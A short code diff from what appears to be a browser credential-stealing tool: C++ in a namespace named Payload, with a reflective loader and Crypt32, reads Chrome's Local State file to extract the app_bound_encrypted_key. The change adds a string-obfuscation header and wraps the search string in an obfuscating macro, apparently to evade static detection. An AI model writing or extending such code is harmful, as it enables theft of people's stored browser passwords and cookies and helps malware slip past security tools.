@@ -25,6 +25,7 @@
 #include <set>
 
 #include "reflective_loader.h"
+#include "string_obfuscation.h"
 #include "sqlite3.h"
 
 #pragma comment(lib, "Crypt32.lib")
@@ -261,12 +262,12 @@ namespace Payload
                 throw std::runtime_error("Could not open Local State file.");
 
             std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
-            const std::string tag = "\"app_bound_encrypted_key\":\"";
-            size_t pos = content.find(tag);
+            TEMP_STR(search_tag, "\"app_bound_encrypted_key\":\"");
+            size_t pos = content.find(search_tag);
             if (pos == std::string::npos)
                 throw std::runtime_error("app_bound_encrypted_key not found.");
 
-            pos += tag.length();
+            pos += search_tag.length();
             size_t end_pos = content.find('"', pos);
             if (end_pos == std::string::npos)
                 throw std::runtime_error("Malformed app_bound_encrypted_key.");
